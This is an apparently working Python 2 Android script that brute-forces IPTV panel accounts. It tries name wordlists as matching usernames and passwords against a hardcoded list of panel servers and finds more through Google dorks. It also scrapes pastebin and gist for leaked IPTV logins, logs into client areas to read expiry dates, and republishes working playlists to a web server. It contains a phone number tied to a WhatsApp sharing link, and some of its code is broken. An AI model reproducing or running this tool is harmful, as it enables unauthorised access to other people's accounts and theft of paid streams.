# -*- coding: utf-8 -*-
#qpy:*
import certifi
import pip
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])
#install('google')
#pip install requests==2.18.4
import requests
from lxml import html
import androidhelper
from time import sleep
from datetime import datetime
import os,ssl,re
import html2text
import sys
import wget
import cookielib
import urllib
import urllib2
import mechanize
from googlesearch import search
from bs4 import BeautifulSoup as BS
from requests.auth import HTTPBasicAuth
now = datetime.now()
dia = str(now.day)
mes = str(now.month)
ano = str(now.year)
hora = str(now.hour)
minuto = str(now.minute)
dicomple = dia+"/"+mes+"/"+ano
#droid = androidhelper.Android()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKRED = '\033[91m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    OKROXO = '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    OKORANGE = '\033[38;5;214m'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'}
headers_2 = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'}
listaips = "linkstvsave.ips"    
ips = ["185.59.223.122","painel.ebanonet.com.br:25461","158.69.22.210:25461","servelive.net:8080","168.205.87.198:8080","leaderpro.com.br:25461","177.139.171.102:27030","clienteworld.com:2082","srvlista.com:80","fonte.iptvmaishd.com:25461","51.15.15.119:8080","maxptv.ddns.net:25461","srv.elitehdbr.vip:8880","ok2.se:8000","lista.digitalgroup.me:80","purpleserver.net","lcmniptv.selfip.com:80","listaccess.me:8880","viptv2.dyndns.tv:2086","play.v4tv.com.br:80","new.iptvbr.tv:8080","167.114.173.170:25461","dns.infinitytv.xyz:8000","31.220.1.190:8080","m3u.iptvstreaming.org:25461","sspitv.liss.fun:8880","listaccess.me:8080"]
templinha = "msmlinha.txt"
linktv = "linkstvsave.txt"
wordA = "first-name-pt-br.txt"
wordB = "nomesusa.txt"
if (os.path.isfile(wordA) == False or os.path.isfile(wordB) == False):
    ssl._create_default_https_context = ssl._create_unverified_context
    url1 = "https://raw.githubusercontent.com/BRDumps/wordlists/master/first-name-pt-br.txt"
    wget.download(url1, out=wordA)
    url2 = "https://raw.githubusercontent.com/dominictarr/random-name/master/first-names.txt"
    wget.download(url2, out=wordB)
if (os.path.isfile(listaips) == True):
    	lerips100 = open(listaips, "r")
    	lerips200 = lerips100.readlines()
    	for lt in lerips200:
        	ips.append(lt.replace("\n",""))
if (os.path.isfile(templinha) == True):
    os.system("rm "+templinha)           	   
class mesmalinha:
    def mesm1(self, textolinha):
        crlabre = open(templinha, "a")
        crlabre.writelines(textolinha)
    def mesm2(self):
        cr2leia = open(templinha, "r")
        return cr2leia
        #os.system("rm "+templinha)
mxl = mesmalinha()
def pegarvalidade(urlval,usern,passw):
    try:
        # Loga e pega validade
        br = mechanize.Browser()
        cookiejar = cookielib.LWPCookieJar()
        br.set_cookiejar(cookiejar)
        # Browser options
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.addheaders = [("User-agent",headers_2)]
        br.open("http://"+urlval+"/client_area")
        #br.open(urlval).code == 200:
        br.select_form(id='login')
        br['username'] = usern
        br['password'] = passw
        di = br.submit()
        doc = html.fromstring(di.read())
        XPATH_NAME = '//div[@class="User"]//text()'
        RAW_TEST = doc.xpath(XPATH_NAME)
        NAME = ' '.join(''.join(RAW_TEST).split()) if RAW_TEST else None
        if "Unlimited" in NAME:
            NAME = NAME+" "+"Link"
            return NAME.split(" ")
        else:
            return NAME.split(" ")
    except:
        return usern,"Expire Date:","BLOCK"," "       
def wordlists(valoresc):
    word1 = "senhasnum.txt"
    word2 = "first-name-pt-br.txt"
    word3 = "nomesusa.txt"
    listwordlist = [word2,word1,word3]
    abreword = open(listwordlist[valoresc], "r")
    return abreword
def auth_alternativo(ipauth,user,passw):
    requests.get('http://'+ipauth+'/client_area', headers=headers, auth=HTTPBasicAuth(user, passw))    
def pegarstatus(ip,users,passs,auth):
    urlpar = "http://"+ip+"/get.php?username="+users+"&password="+passs+"&type=m3u"
    urlpar1 = "http://"+ip+"/client_area"
    if auth == "1":
        rf = auth_alternativo(ip,users,passs)
    else:
        rf = requests.get(urlpar,headers=headers)
    try:
        stat = str(rf.status_code)
        clo45 = bcolors.OKBLUE+urlpar+" status = "+stat+bcolors.ENDC
        vertxt = rf.content
        if vertxt == "":
            statcolor = bcolors.OKRED+"O Site nao valido = "+bcolors.ENDC+clo45
        elif 'EXTM3U' in vertxt:
            statcolor = bcolors.OKGREEN+"Site Valido! = "+bcolors.ENDC+clo45
        if vertxt != "" and not 'EXTM3U' in vertxt:
            statcolor = bcolors.OKRED+"Nao servidor = "+bcolors.ENDC+clo45    
    except:
        statcolor = bcolors.OKRED+"O Host esta offline = "+bcolors.ENDC+bcolors.OKBLUE+urlpar+bcolors.ENDC
    return statcolor
def escrevernoarq(urllink):
    arquivolink = open(linktv,"a")
    if "m3u" in urllink or "_plus" in urllink:
        urllink = urllink.replace("\n","")
        arquivolink.writelines("\n")
        arquivolink.writelines(urllink+"\n\n")
    else:
        arquivolink.writelines(urllink+"\n")
        arquivolink.close()
def pegarolink(linksites):
    arquivolink = open(linksites,"r")
    listalinkx = ["\n\n","\n"]
    printarlink = ["http://","_plus","m3u"]
    for leu1 in arquivolink:
         for leu2 in listalinkx:
             leu1= leu1.replace(leu2,"")
         if "http://" in leu1:
             mxl.mesm1(leu1)
         if "m3u" or "_plus" in leu1:
             mxl.mesm1("\n")
    listatmplk = []         
    for leu2 in mxl.mesm2().readlines():
         if "http://" in leu2:
             if "\n" in leu2:
                 leu2 = leu2.replace("\n","")
             listatmplk.append(leu2)
    return listatmplk
def pegarSUP(lin1):
    if "http://" in lin1:
        lin1 = lin1.replace("http://","")
    if "get.php" in lin1:
        lin1 = lin1.replace("/get.php?username="," ")
    if "&password=" in lin1:
        lin1 = lin1.replace("&password="," ")
    if "&type=m3u" in lin1:
        lin1 = lin1.replace("&type=m3u","")
    if "_plus" in lin1:
        lin1 = lin1.replace("_plus","")      
    listaSUP = lin1.split(" ")
    return listaSUP
                                              
def contlinkinter(urll,nomecanal,nuxt):
    if (os.path.isfile(templinha) == True):
        os.system("rm "+templinha)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'}
    response = requests.get(urll)
    txt = response.content
    mxl.mesm1(txt)
    canais_tv = [nomecanal,"sbt","cartoon","globo","tcm","boomerang","canal","discovery","cult","combate","rede","band","record","space","cnn","mega","curta","ufc","fox","kombat","cinemax","axn"]
    listatemp = []
    ncxl = []
    def pegarcanal():
        ncx = 0
        for nomecanal0 in canais_tv:
            for h in mxl.mesm2():
                if "HD" not in h or "4K" not in h or "FHD" not in h:
                    if nomecanal0 in h:
                        #if len(ncxl) <= nuxt:
                        ncxl.append(ncx)
                    if nomecanal0.swapcase() in h:
                        #if len(ncxl) <= nuxt:
                        ncxl.append(ncx)
                    if nomecanal0.lower().capitalize() in h:
                        #if len(ncxl) <= nuxt:
                        ncxl.append(ncx)
                    h = h.replace("\r\n", "")
                    ncx+=1   
                listatemp.append(h)
    pegarcanal()                          
    contlistx = 1
    contaronline = 0        
    for listarn in ncxl:
        cod = requests.get(listatemp[listarn+1], headers=headers, allow_redirects=False)
        if cod.status_code == 302:
            contaronline+=1    
        if contlistx == nuxt:
            if contaronline != 0:
                return str(nuxt)+"/"+str(contaronline)+" ONLINE"
            else:
                return str(nuxt)+"/"+str(contaronline)+" OFFLINE"    
            break
        contlistx+=1      
def gerarinfserv(ipnew1,usuarior,passwor,ipger,canal,tuxx):
     #siteurl = "/var/www/html/sv1/"
     siteurl = "coco/"
     usuarioval = str(pegarvalidade(ipnew1,usuarior,passwor)[0])
     validadelin = pegarvalidade(ipnew1,usuarior,passwor)
     pasta = "sv1"
     '''escrevernoarq(ipger)
     escrevernoarq("Usuario : "+usuarioval)
     escrevernoarq("Status : "+contlinkinter(ipger,canal,tuxx))
     escrevernoarq(str(validadelin[1])+" "+str(validadelin[2])+" "+str(validadelin[3]))
     escrevernoarq("Data de verificacao : "+dicomple+" "+hora+":"+minuto)'''
     if os.path.isdir(pasta) == False:
         os.system("mkdir "+pasta)
     def gerar1():
         wget.download(ipger, out=pasta+"/boina.m3u")
     if os.path.exists(pasta+"/boina.m3u") == True:
         urlservs = "http://63.142.252.23/sv1/boina.m3u"
         conr = contlinkinter(urlservs,"combate",1)
         if "OFFLINE" in conr:
             os.system("rm "+pasta+"/boina.m3u")
             gerar1()
             os.system("rm "+siteurl+"boina.m3u && mv sv1/boina.m3u "+siteurl+".")
     else:
         gerar1()
         os.system("mv sv1/boina.m3u "+siteurl+".")    
     exit(0)    
def visualcolor():
    if (os.path.isfile("linkstemp.txt") == True):
        os.system("rm linkstemp.txt")
    urlvis = "linkstemp.txt"
    urlvi = open("linkstvsave.txt","r")
    urlviescr = open("linkstemp.txt","a")
    def colorcre(x1,param):
        bi = {"ONLINE":"green","OFFLINE":"red","Usuario":"blue","Data de verificacao":"blue","Status":"blue","Expire Date":"blue"}
        bcon = 1
        for br in x1:
            for par in param:
                if par in br:
                    cor = bi[par]
                    br = br.replace(par,"<font color='"+cor+"'>"+par+"</font>")
            br = br.replace("<font color='green'>ONLINE</font>",'<font color="green">ONLINE</font><input type="text" value="goi" class="text'+str(bcon)+'"/><input type="button" value="COPIAR" class="button'+str(bcon)+'"/>')   
            br = br.replace("\n","<br>")
            urlviescr.writelines(br)
            bcon+=1
    urlviescr.writelines("<!DOCTYPE html><html><head><title>Title of the document</title></head><body>")        
    colorcre(urlvi,["ONLINE","OFFLINE","Usuario","Data de verificacao","Status","Expire Date"])
    urlviescr.writelines('<script src="http://code.jquery.com/jquery-2.1.1.min.js"></script> <script> function copyToClipboard(element) { var $temp = $("<input>"); $("body").append($temp); $temp.val($(element).text()).select(); document.execCommand("copy"); $temp.remove(); alert("Agora e so colar!"); } </script> <div id="div1">Linha1 Linha2 Linha3</div> <div id="div2">Caixa de texto 2</div> <input type="button" onclick="copyToClipboard("#div1") value="Copy P1" /> <button onclick="copyToClipboard("#div2")">Copy P2</button></div></body></html>')
    droid.webViewShow(urlvis)
    droid.addOptionsMenuItem('Quit','menu-quit',None,"ic_lock_power_off")
    event = droid.eventWait().result
    return event
    urlvi.close()
def autoservidor():
    lisip = open(listaips,"a")
    lisip2 = open(listaips, "r")
    leitor0 = lisip2.readlines()
    leitor1 = []
    for ltx in leitor0:
        if "\n" in ltx:
            ltx = ltx.replace("\n","")
            leitor1.append(ltx)
    #print len(leitor1)
    #print leitor1
    quant = 10
    servadd = "inurl:/client_area"
    if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
        ssl._create_default_https_context = ssl._create_unverified_context
    for urlf in search(servadd,tbs='qdr:y',lang='en',stop=quant,user_agent=headers):
        formaturl = urlf.replace("http://","").split("/")[0]
        urlstatu = requests.get(urlf)
        if urlstatu.status_code == 200:
            if len(leitor1) == 0:
                lisip.writelines(formaturl+"\n")
            else:
                if formaturl not in leitor1:
                    lisip.writelines(formaturl+"\n")
                    print bcolors.OKROXO+formaturl+" FOI ADICIONADO"+bcolors.ENDC
                else:
                    print bcolors.OKRED+formaturl+" SERVIDOR JA EXISTE"+bcolors.ENDC                                   
def testarusernames(ipnew,authesc,numword):
    #try:
    cont = 1
    for usuarioreal in wordlists(numword):
         getvalido = pegarstatus(ipnew,usuarioreal,usuarioreal,authesc)
         print getvalido
         cont+=1
         if cont == 10:
             sleep(1)
             cont = 0
         if "Site Valido!" in getvalido:
             ipgerado = "http://"+ipnew+"/get.php?username="+usuarioreal+"&password="+usuarioreal+"&type=m3u"
             gerarinfserv(ipnew,usuarioreal,usuarioreal,ipgerado,"space",1)
    #except Exception as e:
        #print Exception, e
def validarusernames():       
    try:
        droid.dialogCreateAlert("Escolha")   
        droid.dialogSetMultiChoiceItems(["Remover e verificar links internos","Enviar para alguem"])
        droid.dialogSetPositiveButtonText('Confirma')
        droid.dialogShow()
        droid.dialogGetResponse()
        exclulink = droid.dialogGetSelectedItems().result
        droid.dialogDismiss();
        listavalidos = []
        def excluirvx():
            tmplink = "linkstvsave.apagado"
            if (os.path.isfile(tmplink) == True):
                os.system("rm "+tmplink)
            nomec = droid.dialogGetInput("Nome do canal que deseja")[1]
            droid.dialogCreateAlert("Opcoes de contagem")    
            droid.dialogSetSingleChoiceItems(['1','2','3'])
            droid.dialogSetPositiveButtonText('Confirma')
            droid.dialogShow();
            droid.dialogGetResponse()
            opcz = droid.dialogGetSelectedItems().result
            opcz1 = opcz[0]+1
            droid.dialogDismiss();
            for linklist in pegarolink(linktv):
                SUP = pegarSUP(linklist)
                getvl = pegarstatus(SUP[0],SUP[1],SUP[2],"0")
                print getvl
                if "Site Valido!" in getvl:
                    if linklist not in listavalidos:
                        listavalidos.append(linklist)
            droid.dialogCreateHorizontalProgress("Processando","Verificando links",len(listavalidos));
            droid.dialogShow()        
            os.system("mv "+linktv+" "+tmplink)
            value = 0       
            for lic in listavalidos:
                SUP = pegarSUP(lic)
                if "_plus" in lic:
                    lic = lic.replace("_plus","")
                gerarinfserv(SUP[0],SUP[1],SUP[2],lic,str(nomec),opcz1)
                droid.dialogSetCurrentProgress(value)
                sleep(0.01)
                value+=1
            droid.dialogDismiss()
        def enviarvx():
            for escb in listavalidos:
                enter = raw_input("enter")
                escb = escb.replace("&", "%26")
                return "https://api.whatsapp.com/send?phone=5519989041764&text="+escb    
        if len(exclulink) == 2:
            enviarvx()
            excluirvx()
        else:
            if exclulink[0] == 0:
                excluirvx()
            if exclulink[0] == 1:
                enviarvx()
        print bcolors.OKROXO+str(len(listavalidos))+" "+"links validos"+bcolors.ENDC               
        #os.system("rm temp.tmp")
        droid.dialogCreateAlert("Escolha uma opcao")   
        droid.dialogSetSingleChoiceItems(["vizualizar na url","Finalizar"])
        droid.dialogSetPositiveButtonText('Confirma')
        droid.dialogShow()
        droid.dialogGetResponse()
        visuurl = droid.dialogGetSelectedItems().result
        droid.dialogDismiss()
        if visuurl == [0]:
            visualcolor()
        else:
            sys.exit(0)             
        sys.exit(0)     
    except Exception as f:
        print "Erro",f
class graficos:
    def testusergr(self):
        k = 0
        listaserv = []
        while k < len(ips):
            m1 = ips[k]
            listaserv.append(m1)
            k+=1
        for pgh in pegarolink(linktv):
            SUPX = pegarSUP(pgh)
            if SUPX[0] not in listaserv:
                listaserv.append(SUPX[0])
                ips.append(SUPX[0])   
        con = 0
        for a in listaserv:
            print "%s = %s\n" %(con,a)
            con+=1
        esc1 = sys.argv[2]   
        lius = ['Nomes de pessoas','Numeros','Nomes USA']
        con1 = 0
        for a1 in lius:
            print "%s = %s\n" %(con1,a1)
            con1+=1
        esc2 = sys.argv[3]
        return int(esc1),'0',int(esc2)    
graf = graficos()
def abrirurldroid(uri2open):
    intent2start = droid.makeIntent("android.intent.action.VIEW", uri2open, "text/html", None, [u"android.intent.category.BROWSABLE"], None, None, None)
    return droid.startActivityForResultIntent(intent2start.result)

def addserverhttp(canaladd):
    abrec = open("linkstvsave.txt","a")
    if "get.php" in canaladd:
        if canaladd != "":
            canaladd2 = canaladd.replace(" ","")
        canaladd = pegarSUP(canaladd)    
    else:
        canaladd = canaladd.replace("http://","")
        if " " in canaladd:
            canaladd = canaladd.replace(" ","")
        if "live" in canaladd:
            canaladd = canaladd.replace("/live","")   
        canaladd = canaladd.split("/")
        canaladd2 = "http://"+canaladd[0]+"/get.php?username="+canaladd[1]+"&password="+canaladd[2]+"&type=m3u_plus"
    lstservd = pegarolink(linktv)    
    getvalid0 = pegarstatus(canaladd[0],canaladd[1],canaladd[2],"0")
    if "Site Valido!" in getvalid0:
        print getvalid0
        if canaladd2 not in lstservd:
            gerarinfserv(canaladd[0],canaladd[1],canaladd[2],canaladd2,"combate",1)
    else:
        print bcolors.OKRED+"site invalido status 400"+bcolors.ENDC+"\n"+"Site : "+bcolors.OKROXO+canaladd2+bcolors.ENDC
def autologinhttp():
    abrtstvl = open("linkstvsave.txt", "r")
    #abrtstvl.readlines()
    for ab in abrtstvl:
        if "http://" in ab:
            #print ab
            if "get.php" in ab:
                ab = ab.replace("get.php","client_area")
                #print ab
        if "m3u" in ab:
            ab = ab.replace("&type=m3u","")
            if "_plus" in ab:
                 ab = ab.replace("_plus","")
            print bcolors.OKGREEN+ab+bcolors.ENDC
            print "\n"
    abrtstvl.close()  
def pesquisaAuto(servif,quant):
    """&tbs=rltm:1 [real time results]
    &tbs=qdr:s [past second]
    &tbs=qdr:n [past minute]
    &tbs=qdr:h [past hour]
    &tbs=qdr:d [past 24 hours (day)]
    &tbs=qdr:w [past week]
    &tbs=qdr:m [past month]
    &tbs=qdr:y [past year]"""
    useragg = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
    def google_scrape(url,par,serviesc):
        if (os.path.isfile(templinha) == True):
            os.system("rm "+templinha)
        #html = urllib.urlopen(url).gettext()
        #tags = re.findall(par, html)
        re = requests.get(url, verify=True)
        re1 = re.content
        mxl.mesm1(re1)
        listb = []
        serviesc = str(serviesc)
        serviesc1 = serviesc+"/live"
        if ":" in serviesc:
            serviesc2 = serviesc.split(":")[0]+"/live"
        else:
            serviesc2 = serviesc    
        for pa in mxl.mesm2():
            if serviesc1 in pa or serviesc in pa or serviesc2 in pa:
                if "m3u_plus http://" in pa or "m3u http://"  in pa:
                    listb.append(pa.split(" ")[0])
                else:
                    listb.append(pa)
        return listb[0]
    if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
        ssl._create_default_https_context = ssl._create_unverified_context    
    def pesquisaautofin(sitep,sitep2):
        pe= 'intext:"%s" site:%s' %(servif,sitep)
        #pe= "tv.factoryiptv.com"
        #servif = str(servif).split(":")[0]
        for url in search(pe,tbs='qdr:m',lang='en',stop=quant,user_agent=useragg):
            url = url.replace(sitep,sitep2)
            if "gist.github.com" in url:
                url = url+"/raw"
            print bcolors.OKROXO+"procurando em :"+url+bcolors.ENDC   
            print google_scrape(url,pe,servif)
            addserverhttp(google_scrape(url,pe,servif))
    try:
        pesquisaautofin("pastebin.com","pastebin.com/raw")
        pesquisaautofin("gist.github.com","gist.github.com")
    except urllib2.HTTPError:
        print bcolors.OKRED+"SITE FORA "+bcolors.ENDC+bcolors.OKORANGE+"(Tente mais tarde)"+bcolors.ENDC        
def addhttpgraf():
    canalad = droid.dialogGetInput("Cole ou digite o link aqui")[1]
    addserverhttp(canalad)    
def pesquisarURL():
    url1 = "https://www.google.com/search?q=intext%3A%22Globo%20HD%22+site%3Apastebin.com&oq=in&aqs=chrome.1.69i60j69i59j69i60l2j69i57j69i59.1437j0j4&sourceid=chrome-mobile&ie=UTF-8&as_qdr=w"    
    url2 = "https://www.google.com/search?q=Combate+HD+site:pastebin.com+--/live/+--%23EXTINF&client=ms-android-asus-tpin&prmd=vnsi&source=lnt&tbs=qdr:w&sa=X&ved=2ahUKEwiEr-TXxLLgAhWsIbkGHQuGDvwQpwV6BAgIEBI&biw=360&bih=560&dpr=2"
    droid.dialogCreateAlert("Opcoes de URL")    
    droid.dialogSetSingleChoiceItems(['Pesquisa 1(globo HD)','Pesquisa 2(Combate HD)','Pesquisa Automatica'])
    droid.dialogSetPositiveButtonText('Confirma')
    droid.dialogShow();
    droid.dialogGetResponse()
    urlxl = droid.dialogGetSelectedItems().result
    droid.dialogDismiss();
    if urlxl == [0]:
        abrirurldroid(url1)
    if urlxl == [1]:
        abrirurldroid(url2)
    if urlxl == [2]:
        kh = 0
        listaservp = []
        while kh < len(ips):
            m11 = ips[kh]
            listaservp.append(m11)
            kh+=1
        for pgh in pegarolink(linktv):
            SUPXZ = pegarSUP(pgh)
            if SUPXZ[0] not in listaservp:
                listaservp.append(SUPXZ[0])
                ips.append(SUPXZ[0])  
        droid.dialogCreateAlert("Escolha uma opcao")    
        droid.dialogSetSingleChoiceItems(listaservp)
        droid.dialogSetPositiveButtonText('Confirma')
        droid.dialogShow();
        droid.dialogGetResponse()
        esc11 = droid.dialogGetSelectedItems().result
        droid.dialogDismiss();
        while 1:
            try:
                quant = int(raw_input("numero maximo de pesquisa: "))
            except ValueError:
                quant = "null"
            if quant != "null":
                break                  
        pesquisaAuto(ips[esc11[0]],quant)
def iptvleitor():
    "#EXTINF:-1"        
def sair():
    #droid.makeToast('Saindo do app!')
    exit(0)
    print f.status_code                            
def rodarsoftwa():
    muro = "[ %s ] TESTAR USERNAMES","[ %s ] PESQUISAR LISTAS NA URL","[ %s ] ATUALIZAR AS LISTAS","[ %s ] LOGAR NAS LISTAS","[ %s ] ADD LISTA OU LINK NO ARQUIVO TXT","[ %s ] VIZUALIZAR EM COR","[ %s ] PEGAR SERVIDORES NA REDE","[ %s ] SAIR [X]"
    u = 0
    listaopc = []
    while u < len(muro):
        m = muro[u] %(u+1)
        print m+"\n"
        listaopc.append(m)
        u+=1
    escolha = str(sys.argv[1])
    if escolha == "0":
        graf0 = graf.testusergr()
    esco111 = {
    	"0":"testarusernames(ips[graf0[0]],graf0[1],graf0[2])",
    	"1":"pesquisarURL()",
    	"2":"validarusernames()",
    	"3":"autologinhttp()",
    	"4":"addhttpgraf()",
    	"5":"visualcolor()",
    	"6":"autoservidor()",
    	"7":"sair()"
    	}
    esc3 = esco111[str(escolha[0])]
    exec esc3
if __name__ == "__main__":
    '''try:
        rodarsoftwa()
    except:
        print "erro"'''
    rodarsoftwa()